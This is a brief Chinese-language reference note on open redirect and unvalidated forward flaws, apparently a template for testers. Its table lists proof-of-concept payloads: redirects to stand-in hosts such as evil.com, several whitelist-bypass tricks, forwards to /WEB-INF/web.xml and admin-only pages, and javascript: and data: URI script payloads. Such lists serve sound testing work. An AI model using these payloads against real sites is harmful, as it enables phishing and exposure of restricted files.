# Redirect Family（Open Redirect / Unvalidated Forward）

## 共性

应用根据外部参数做跳转或转发。攻击者控制目标 URL → 钓鱼 / 内网探测 / 二次攻击。

## PoC 模板

| 场景 | poc_payload |
|---|---|
| 基础重定向 | `url=https://evil.com/phishing` |
| Protocol-relative | `url=//evil.com/phishing` |
| 白名单绕过 (子串) | `url=https://attacker.com/?safe=safedomain.com` |
| 白名单绕过 (前缀+@) | `url=https://safedomain.com@evil.com/` |
| 白名单绕过 (前缀+.) | `url=https://safedomain.com.evil.com/` |
| URL 双重编码 | `url=https%3A%2F%2Fsafe.com%2540evil.com` |
| Unvalidated Forward | `path=/WEB-INF/web.xml` / `path=/admin/internal-only.jsp` |
| Data URI（部分浏览器） | `url=data:text/html,<script>alert(1)</script>` |
| JavaScript scheme | `url=javascript:alert(1)` （仅在 `href` 等 sink 生效，非 sendRedirect）|
